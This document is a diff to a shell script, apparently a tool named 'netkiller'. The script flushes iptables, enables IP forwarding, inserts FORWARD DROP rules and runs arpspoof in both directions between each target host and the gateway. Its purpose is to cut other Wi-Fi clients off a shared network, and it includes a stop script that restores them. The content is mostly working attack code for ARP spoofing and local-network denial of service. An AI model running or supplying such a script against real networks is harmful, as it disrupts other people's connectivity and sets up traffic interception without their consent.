@@ -24,6 +24,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -F
 iptables -X
 iptables -t nat -F
+iptables -F FORWARD 
 
 # Remove Iptables rules
 cat > /bin/netkiller-stop << EOF
@@ -32,6 +33,7 @@ cat > /bin/netkiller-stop << EOF
 iptables -F
 iptables -X
 iptables -t nat -F
+iptables -F FORWARD 
 pkill arpspoof
 echo "Wifi clients connection are restored...!!!"
 EOF
@@ -57,10 +59,12 @@ for TARGET in $TARGET_IPS; do
             END=$(ip2int $HOSTMAX)
             for ((i=START; i<=END; i++)); do
                 TARGET_IP=$(int2ip $i)
+
+                VALUE="${MYIP:-$TARGET_IP}"
                 (
                     # Block all the traffic except the device ip and gateway (bidirectional)
-                    iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-                    iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
+                    iptables -I FORWARD ! -s "$VALUE" -d "$GATEWAY" -j DROP
+                    iptables -I FORWARD ! -s "$GATEWAY" -d "$VALUE" -j DROP
         
                     arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
                     arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
